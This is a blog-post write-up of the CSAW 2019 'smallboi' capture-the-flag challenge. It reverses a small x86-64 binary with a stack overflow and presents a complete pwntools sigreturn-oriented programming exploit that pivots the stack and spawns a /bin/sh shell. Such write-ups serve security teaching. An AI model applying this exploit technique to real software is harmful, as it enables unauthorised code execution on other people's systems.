<!doctype html><html lang=en>
<head>
<title>CSAW 2019 :: Smallboi :: Anvbis</title>
<meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta name=description content="CSAW 2019 'smallboi' challenge writeup.">
<meta name=keywords content>
<meta name=robots content="noodp">
<link rel=canonical href=https://www.anvbis.net/posts/csaw-2019-smallboi/>
<link rel=stylesheet href=https://www.anvbis.net/assets/style.css>
<link rel=stylesheet href=https://www.anvbis.net/assets/green.css>
<link rel=apple-touch-icon href=https://www.anvbis.net/img/apple-touch-icon-192x192.png>
<link rel="shortcut icon" href=https://www.anvbis.net/img/favicon/green.png>
<meta name=twitter:card content="summary">
<meta property="og:locale" content="en">
<meta property="og:type" content="article">
<meta property="og:title" content="CSAW 2019 :: Smallboi">
<meta property="og:description" content="CSAW 2019 'smallboi' challenge writeup.">
<meta property="og:url" content="https://www.anvbis.net/posts/csaw-2019-smallboi/">
<meta property="og:site_name" content="Anvbis">
<meta property="og:image" content="https://www.anvbis.net/img/favicon/green.png">
<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">
<meta property="article:section" content="SigROP">
<meta property="article:section" content="Stack Pivot">
<meta property="article:section" content="CTF">
<meta property="article:section" content="Linux">
<meta property="article:published_time" content="2021-08-15 00:00:00 +0000 UTC">
</head>
<body class=green>
<div class="container center headings--one-size">
<header class=header>
<div class=header__inner>
<div class=header__logo>
<a href=/>
<div class=logo>
anvbis
</div>
</a>
</div>
<div class=menu-trigger>menu</div>
</div>
<nav class=menu>
<ul class="menu__inner menu__inner--desktop">
<li><a href=/posts>Blog</a></li>
</ul>
<ul class="menu__inner menu__inner--mobile">
<li><a href=/posts>Blog</a></li>
</ul>
</nav>
</header>
<div class=content>
<div class=post>
<h1 class=post-title>
<a href=https://www.anvbis.net/posts/csaw-2019-smallboi/>CSAW 2019 :: Smallboi</a></h1>
<div class=post-meta>
<span class=post-date>
2021-08-15
</span>
</div>
<div class=post-content><div>
<h2 id=reverse-engineering>Reverse Engineering<a href=#reverse-engineering class=hanchor arialabel=Anchor>&#8983;</a> </h2>
<p>Like usual, we&rsquo;ll start by running <code>file</code> to get a brief overflow of the executable&rsquo;s architecture. Note that it is a 64-bit linux executable.</p>
<pre><code>$ ./small_boi
./small_boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=070f96f86ab197c06c4a6896c26254cce3d57650, stripped
</code></pre><p>Running <code>checksec</code> reveals that the only exploit protection in place is that the NX bit is enabled. Meaning we won&rsquo;t be able to execute any shellcode on the stack.</p>
<pre><code>$ checksec ./small_boi
[*] './small_boi'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre><p>Running the executable reveals that it, at some point, takes user input. We&rsquo;ll need to investigate this further to determine whether there is a vulnerability present.</p>
<pre><code>$ ./small_boi
asdfsadf
</code></pre><p>Viewing the disassembly of the entrypoint reveals that it calls some unknown function before it makes an <code>exit</code> syscall.</p>
<pre><code>entry0 ();
0x004001ad      push rbp
0x004001ae      mov rbp, rsp
0x004001b1      mov eax, 0
0x004001b6      call fcn.0040018c
0x004001bb      xor rax, rdi
0x004001be      mov rax, 0x3c      ; '&lt;' ; 60
0x004001c5      syscall            ; exit(...)
0x004001c7      nop
0x004001c8      pop rbp
0x004001c9      ret
</code></pre><p>Disassembling the function called within the entrypoint reveals a likely buffer overflow vulnerability.</p>
<p>We can see that the function reads 512 bytes of data in from <code>stdin</code> and stores it at a location only 32 bytes below the base of the function&rsquo;s stack frame.</p>
<pre><code>fcn.0040018c ();
; var int64_t var_20h @ rbp-0x20
0x0040018c      push rbp
0x0040018d      mov rbp, rsp
0x00400190      lea rax, [var_20h] ; rax = *var_20h
0x00400194      mov rsi, rax       ; rsi = rax = *var_20h
0x00400197      xor rax, rax       ; rax = 0
0x0040019a      xor rdi, rdi       ; rdi = 0
0x0040019d      mov rdx, 0x200     ; rdx = 512
0x004001a4      syscall            ; read(stdin, *var_20h, 512)
0x004001a6      mov eax, 0
0x004001ab      pop rbp
0x004001ac      ret
</code></pre><p>Looking at the disassembly for the <code>.text</code> section, we can see a sigreturn syscall. We can use this to execute any arbitrary syscall with a forged sigreturn frame.</p>
<pre><code>;-- section..text:
0x0040017c      push rbp           ; [02] -r-x section size 78 named .text
0x0040017d      mov rbp, rsp
0x00400180      mov eax, 0xf       ; 15
0x00400185      syscall            ; rt_sigreturn(...)
0x00400187      nop
0x00400188      pop rbp
0x00400189      ret
</code></pre><p>We also discover a <code>"/bin/sh"</code> string stored in the <code>.rodata</code> section. This could be very useful - however, I&rsquo;m going to avoid using it.</p>
<p>I believe there should be another solution (albeit a more complex solution) that allows us to avoid using this string. I&rsquo;ve arbitrarily decided that it feels a little like cheating.</p>
<pre><code>;-- str.bin_sh:
;-- section..rodata:
0x004001ca          .string &quot;/bin/sh&quot; ; len=8 ; [03] -r-- section size 8 named .rodata
</code></pre><p>For our alternative solution, we need to find a section within the binary that we have write permissions for.</p>
<p>Using <code>readelf</code>, we can see that we have write permissions for the <code>.data</code> section, stored at <code>0x601000</code>. We&rsquo;ll use this location to write a <code>"/bin/sh"</code> string, and pivot our stack.</p>
<pre><code>$ readelf --sections ./small_boi 
There are 9 section headers, starting at offset 0x1090:

Section Headers:
  [Nr] Name              Type             Address           Offset
       Size              EntSize          Flags  Link  Info  Align
  [ 0]                   NULL             0000000000000000  00000000
       0000000000000000  0000000000000000           0     0     0
  [ 1] .note.gnu.bu[...] NOTE             0000000000400158  00000158
       0000000000000024  0000000000000000   A       0     0     4
  [ 2] .text             PROGBITS         000000000040017c  0000017c
       000000000000004e  0000000000000000  AX       0     0     1
  [ 3] .rodata           PROGBITS         00000000004001ca  000001ca
       0000000000000008  0000000000000000   A       0     0     1
  [ 4] .eh_frame_hdr     PROGBITS         00000000004001d4  000001d4
       0000000000000024  0000000000000000   A       0     0     4
  [ 5] .eh_frame         PROGBITS         00000000004001f8  000001f8
       0000000000000078  0000000000000000   A       0     0     8
  [ 6] .data             PROGBITS         0000000000601000  00001000
       0000000000000010  0000000000000000  WA       0     0     8
  [ 7] .comment          PROGBITS         0000000000000000  00001010
       000000000000002a  0000000000000001  MS       0     0     1
  [ 8] .shstrtab         STRTAB           0000000000000000  0000103a
       0000000000000053  0000000000000000           0     0     1
</code></pre><h2 id=information-gathering>Information Gathering<a href=#information-gathering class=hanchor arialabel=Anchor>&#8983;</a> </h2>
<p>Let&rsquo;s do a little more information gathering before we write our exploit. We just need to find the offset of the return address from the start of the input buffer.</p>
<p>Here&rsquo;s a quick script that&rsquo;ll send a cyclic pattern of bytes to the input that we can use to find the offset of the return address.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=color:#75715e>#!/usr/bin/env python3</span>

<span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>


r <span style=color:#f92672>=</span> process(<span style=color:#e6db74>&#39;./small_boi&#39;</span>)
gdb<span style=color:#f92672>.</span>attach(r)

r<span style=color:#f92672>.</span>clean()
r<span style=color:#f92672>.</span>writeline(cyclic(<span style=color:#ae81ff>512</span>, n<span style=color:#f92672>=</span><span style=color:#ae81ff>8</span>))

r<span style=color:#f92672>.</span>interactive()
</code></pre></div><p>Continuing in GDB, and letting the executable crash, reveals the data that overwrote the value of the return address.</p>
<pre><code> â–º 0x4001ac    ret    &lt;0x6161616161616166&gt;
</code></pre><p>Using pwntools' <code>cyclic_find</code> function, and using the value above, we can find the offset of the return address from the start of our input buffer.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py>In [<span style=color:#ae81ff>2</span>]: cyclic_find(<span style=color:#ae81ff>0x6161616161616166</span>, n<span style=color:#f92672>=</span><span style=color:#ae81ff>8</span>)
Out[<span style=color:#ae81ff>2</span>]: <span style=color:#ae81ff>40</span>
</code></pre></div><h2 id=exploit-development>Exploit Development<a href=#exploit-development class=hanchor arialabel=Anchor>&#8983;</a> </h2>
<p>We can chain sigreturn instructions to perform a <code>read</code> syscall and store <code>"/bin/sh"</code> in memory, before making another sigreturn call to execute <code>execve</code> with our <code>"/bin/sh"</code> string.</p>
<p>We just need to make sure that our first forged sigreturn frame maintains <code>$rip</code> and pivots the stack to <code>.data</code>, where we can continue execution.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=color:#75715e>#!/usr/bin/env python3</span>

<span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>

context<span style=color:#f92672>.</span>clear(arch<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;amd64&#39;</span>)


pad <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;A&#39;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>40</span>


<span style=color:#75715e># address of sigreturn syscall</span>
sigret <span style=color:#f92672>=</span> p64(<span style=color:#ae81ff>0x00400180</span>)

<span style=color:#75715e># address of &#34;/bin/sh&#34; string </span>
bin_sh <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x004001ca</span>

<span style=color:#75715e># address of syscall instruction</span>
<span style=color:#e6db74>&#39;&#39;&#39;
</span><span style=color:#e6db74>syscall; nop; pop rbp; ret
</span><span style=color:#e6db74>&#39;&#39;&#39;</span>
syscall <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x0400185</span>

<span style=color:#75715e># address of data section</span>
data <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x00601000</span> 


read_frame <span style=color:#f92672>=</span> SigreturnFrame()

read_frame<span style=color:#f92672>.</span>rax <span style=color:#f92672>=</span> constants<span style=color:#f92672>.</span>SYS_read
read_frame<span style=color:#f92672>.</span>rdi <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
read_frame<span style=color:#f92672>.</span>rsi <span style=color:#f92672>=</span> data
read_frame<span style=color:#f92672>.</span>rdx <span style=color:#f92672>=</span> <span style=color:#ae81ff>1000</span>
read_frame<span style=color:#f92672>.</span>rip <span style=color:#f92672>=</span> syscall
read_frame<span style=color:#f92672>.</span>rsp <span style=color:#f92672>=</span> data <span style=color:#f92672>+</span> <span style=color:#ae81ff>8</span>

read_frame <span style=color:#f92672>=</span> bytes(read_frame) 


execve_frame <span style=color:#f92672>=</span> SigreturnFrame()

execve_frame<span style=color:#f92672>.</span>rax <span style=color:#f92672>=</span> constants<span style=color:#f92672>.</span>SYS_execve
execve_frame<span style=color:#f92672>.</span>rdi <span style=color:#f92672>=</span> data
execve_frame<span style=color:#f92672>.</span>rsi <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
execve_frame<span style=color:#f92672>.</span>rdx <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
execve_frame<span style=color:#f92672>.</span>rip <span style=color:#f92672>=</span> syscall

execve_frame <span style=color:#f92672>=</span> bytes(execve_frame)


r <span style=color:#f92672>=</span> process(<span style=color:#e6db74>&#39;./small_boi&#39;</span>)

r<span style=color:#f92672>.</span>clean()
r<span style=color:#f92672>.</span>writeline(pad <span style=color:#f92672>+</span> sigret <span style=color:#f92672>+</span> read_frame)

r<span style=color:#f92672>.</span>clean(<span style=color:#ae81ff>1</span>)
r<span style=color:#f92672>.</span>writeline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;/bin/sh</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#39;</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;A&#39;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>8</span> <span style=color:#f92672>+</span> sigret <span style=color:#f92672>+</span> execve_frame)

r<span style=color:#f92672>.</span>clean()
r<span style=color:#f92672>.</span>interactive()
</code></pre></div><p>And finally, here&rsquo;s our exploit in action.</p>
<pre><code>$ ./exploit.py
[+] Starting local process './small_boi': pid 2731
[*] Switching to interactive mode
$ cat flag.txt
csaw19{smallboi}
$ 
[*] Stopped process './small_boi' (pid 2731)
</code></pre>
</div></div>
</div>
</div>
<footer class=footer>
<div class=footer__inner>
<div class="copyright copyright--user">
<span>Copyright 2020 Anvbis</span>
<span>:: Theme made by <a href=https://twitter.com/panr>panr</a></span>
</div>
</div>
</footer>
<script src=https://www.anvbis.net/assets/main.js></script>
<script src=https://www.anvbis.net/assets/prism.js></script>
</div>
</body>
</html>